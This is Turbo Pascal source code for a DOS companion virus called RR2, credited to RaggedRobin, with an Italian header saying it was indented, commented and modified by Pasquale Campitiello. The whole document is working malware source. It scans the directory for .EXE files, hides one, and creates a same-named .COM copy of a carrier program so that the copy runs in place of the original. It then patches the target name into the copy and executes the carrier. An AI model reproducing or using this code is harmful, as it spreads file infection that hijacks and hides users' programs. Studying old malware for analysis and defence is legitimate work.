{RR2: virus by RaggedRobin;
identato, commentato e modificato da Pasquale Campitiello}

program rr2;
{$M $4000,0,0}   {16K stack, no heap}        {1}
uses dos,crt;
type fil=file of char;
var filexe,filecom:array[1..100]of string;
    f,fvir:fil;
    s,s1,infetto,target,sano:string;
    c,app:char;
    i,j,z,k,trovato:integer;
    DirInfo:SearchRec;

begin
 clrscr;

 for i:=1 to 100 do                          {2}
  begin
   filexe[i]:='';
   filecom[i]:='';
  end;

 j:=0;
 k:=0;
 trovato:=0;
 z:=0;
 i:=0;
 s:='more.com';   {3}

 findFirst('*.EXE', Archive, DirInfo);   {4}
 if DosError=0 then
                Repeat
                 i:=i+1;
                 filexe[i]:=DirInfo.name;
                 findnext(DirInfo);
                Until DosError<>0;

 findfirst('*.com', Archive,dirinfo);   {5}
 if DosError=0 then
                Repeat
                 j:=j+1;
                 filecom[j]:=DirInfo.name;
                 findnext(DirInfo);
                Until DosError<>0;

{STAMPA VETTORI FILEXE E FILECOM
 for k:=1 to i do
  writeln(filexe[k]);
 for k:=1 to j do
   writeln(filecom[k]);         }

 repeat                                   {6}
  k:=0;
  trovato:=0;
  z:=z+1;
  infetto:=filexe[z];
  delete(infetto,(length(infetto)-2),3);
  infetto:=infetto+'COM';
  repeat
   k:=k+1;
   if infetto=filecom[k] then trovato:=1;
  until k=j;
  if trovato<>1 then target:=INFETTO;
 until (z=i) or (trovato<>1);

 if filexe[1]='' then trovato:=1;            {7}

 if trovato<>1 then                          {8}
                  begin
                   sano:=target;
                   delete(sano,(length(sano)-2),3);
                   sano:=sano+'EXE';
                   assign(f,sano);           {9}
                   setfattr(f,hidden);
                   for i:=1 to 12-length(target) do target:=target+' ';
                   assign(fvir,target);      {10}
                   rewrite(fvir);
                   assign(f,s);
                   reset(f);
                   repeat                    {11}
                    read(f,c);
                    write(fvir,c);
                   until eof(f);
                   close(f);
                   seek(fvir,321);           {12}
                   for i:=1 to length(target) do write(fvir,target[i]);
                   app:=chr(32);
                   for i:=length(sano) to 11 do write(fvir,app);
                   close(fvir);
                  end;
 {delete(s,(length(s)-2),3);                  {13}
 {s:=s+'EXE';}
 SwapVectors;
 Exec(s,'');
 SwapVectors;

{SwapVectors;
 Exec('c:\windows\command.com','/c'+'RR2.EXE');
 SwapVectors;}

 readln;
end.